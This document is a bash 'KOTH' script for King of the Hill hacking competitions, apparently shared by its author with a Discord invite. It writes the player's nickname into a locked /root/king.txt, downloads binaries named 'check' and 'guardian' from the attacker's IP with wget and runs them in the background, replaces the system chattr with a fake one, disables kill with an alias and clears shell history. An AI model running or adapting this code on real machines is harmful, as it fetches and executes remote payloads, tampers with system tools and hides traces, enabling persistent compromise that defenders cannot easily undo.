#!/bin/bash
# Created by @H3X-007 ;)
echo
echo "Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :D "
echo
echo "Join our Discord Server: https://discord.gg/y3aCGbrT8J"
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
read -p "Enter your nickname: " nick
read -p "What is your vpn ip ?: " IP
echo "Hello $nick :) Let's go"
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
set write off
echo 
echo "Patch part successfully ended..."
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
chmod +x /usr/bin/chattr
sudo chattr -i /root/king.txt
echo "$nick" >> /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +i /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt
echo 
echo
echo "-----------------------------------------------------------------------------"
echo 
echo "Files Operation Complete... Starting Operation 2..."
echo 
echo "-----------------------------------------------------------------------------"
echo
echo "Let's Go Forward... :)"
echo
echo "-----------------------------------------------------------------------------"
alias kill='echo "Sorry, the kill command is disabled."'
echo "-----------------------------------------------------------------------------"
echo
cd /usr/bin && wget http://$IP/check && chmod +x check 
./check &
cd /usr/bin && wget http://$IP/guardian && chmod +x guardian 
./guardian &
chattr +ai /usr/bin/check && chattr +ai /usr/bin/guardian
echo
echo "--------------------File successfully running in the background---------------"
echo "-----------------------------------------------------------------------------"
echo
rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
echo
echo "------------------Fake chattr successfully added-----------------"
echo "-----------------------------------------------------------------"
echo "$IP" > /etc/HOST &
echo "$nick" > /etc/nick &
history -c
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
echo "Operation Fully Complete. The KING is $nick ! :) "
echo
echo "--------------Hi $nick don't forget to give us a star on Github--------------"
echo "-----------------------------------------------------------------------------"
